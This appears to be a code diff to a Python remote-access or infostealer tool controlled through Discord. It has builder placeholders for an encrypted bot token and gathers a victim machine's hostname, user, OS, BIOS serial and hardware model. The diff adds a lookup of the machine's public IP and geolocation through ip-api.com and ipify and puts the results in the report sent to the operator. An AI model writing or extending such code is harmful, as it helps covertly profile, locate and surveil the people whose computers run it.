@@ -2,7 +2,9 @@ import os
 import sys
 import io
 import time
+import json
 import shutil
+import urllib.request
 import subprocess
 import random
 import string
@@ -23,7 +25,7 @@ except ImportError:
 
 DEBUG = False
 appVersion = "1.0"
-appBuild = "".join(random.choices(string.ascii_letters + string.digits, k=4))
+appBuild = "__MARKER_APP_BUILD__"
 
 _K = b"__MARKER_TOKEN_KEY__"
 _C = b"__MARKER_TOKEN_ENC__"
@@ -152,6 +154,45 @@ def query_wmi(query, attrs):
         pass
     return "N/A"
 
+def get_flag_emoji(country_code):
+    try:
+        if country_code and len(country_code) == 2 and country_code.isalpha():
+            return chr(127397 + ord(country_code[0].upper())) + chr(127397 + ord(country_code[1].upper()))
+    except Exception:
+        pass
+    return ""
+
+def get_public_ip_and_location():
+    pub_ip = "N/A"
+    location = "N/A"
+    try:
+        req = urllib.request.Request("http://ip-api.com/json/", headers={"User-Agent": "Mozilla/5.0"})
+        with urllib.request.urlopen(req, timeout=5) as resp:
+            data = json.loads(resp.read().decode("utf-8"))
+            if data.get("status") == "success":
+                pub_ip = data.get("query", "N/A")
+                city = data.get("city", "")
+                country_code = data.get("countryCode", "")
+                flag = get_flag_emoji(country_code)
+                loc_parts = [p for p in [city, country_code] if p]
+                loc_str = ", ".join(loc_parts)
+                if flag:
+                    loc_str += f" {flag}"
+                location = loc_str if loc_str else "N/A"
+    except Exception:
+        pass
+
+    if pub_ip == "N/A":
+        try:
+            req = urllib.request.Request("https://api.ipify.org?format=json", headers={"User-Agent": "Mozilla/5.0"})
+            with urllib.request.urlopen(req, timeout=5) as resp:
+                data = json.loads(resp.read().decode("utf-8"))
+                pub_ip = data.get("ip", "N/A")
+        except Exception:
+            pass
+
+    return pub_ip, location
+
 def get_sys_info(prefix_str):
     try:
         hostname = socket.gethostname()
@@ -178,23 +219,20 @@ def get_sys_info(prefix_str):
     except Exception:
         os_info = f"{platform.system()} {platform.version()}"
 
-    v4_list, v6_list = [], []
+    v6_list = []
     try:
         net_addrs = psutil.net_if_addrs()
         for iface, addrs in net_addrs.items():
             for addr in addrs:
-                if addr.family == socket.AF_INET:
-                    ip = addr.address
-                    if not ip.startswith("127.") and not ip.startswith("169.254."):
-                        v4_list.append(ip)
-                elif addr.family == socket.AF_INET6:
+                if addr.family == socket.AF_INET6:
                     ip = addr.address
                     if ip != "::1" and not ip.lower().startswith("fe80"):
                         v6_list.append(ip)
     except Exception:
         pass
-    v4_str = ", ".join(v4_list) if v4_list else "N/A"
     v6_str = ", ".join(v6_list) if v6_list else "N/A"
+
+    pub_ip, location = get_public_ip_and_location()
 
     serial_no = query_wmi("SELECT SerialNumber FROM Win32_BIOS", ["SerialNumber"])
     mfg_model = query_wmi("SELECT Manufacturer, Model FROM Win32_ComputerSystem", ["Manufacturer", "Model"])
@@ -220,7 +258,8 @@ def get_sys_info(prefix_str):
     embed.add_field(name="Hostname", value=hostname, inline=True)
     embed.add_field(name="Current User", value=user, inline=True)
     embed.add_field(name="Operating System", value=os_info, inline=False)
-    embed.add_field(name="IPv4", value=v4_str, inline=True)
+    embed.add_field(name="Public IPv4", value=pub_ip, inline=True)
+    embed.add_field(name="Location", value=location, inline=True)
     embed.add_field(name="IPv6", value=v6_str, inline=True)
     embed.add_field(name="Serial Number", value=serial_no, inline=True)
     embed.add_field(name="Manufacturer & Model", value=mfg_model, inline=True)
